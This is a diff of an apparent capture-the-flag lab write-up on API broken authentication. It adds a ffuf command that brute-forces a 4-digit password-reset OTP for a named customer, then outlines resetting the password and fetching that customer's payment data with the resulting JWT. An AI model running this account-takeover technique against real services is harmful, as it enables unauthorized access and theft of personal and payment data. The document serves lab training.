@@ -18,11 +18,9 @@ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:P
 
 Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.
 ```
-{
-      "id": "53428a83-8591-4548-a553-c434ad76a61a",
-      "name": "Mason Jenkins",
-      "email": "MasonJenkins@ymail.com",
-      "phoneNumber": "+44 7451 162707",
-      "birthDate": "1985-09-16"
-    }
+seq -w 0 9999 >> otp.txt
+ffuf -w ./otp.txt -u http://83.136.255.170:50254/api/v1/authentication/customers/passwords/resets -X POST -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "OTP": "FUZZ", "NewPassword": "P@ssword1"}' -fs 23
 ```
+- Create OTP with /api/v1/authentication/customers/passwords/resets/email-otps
+- Brute force OTP with above and reset password
+- Login with Mason user to get JWT and then find flag under /api/v1/customers/payment-options/current-user
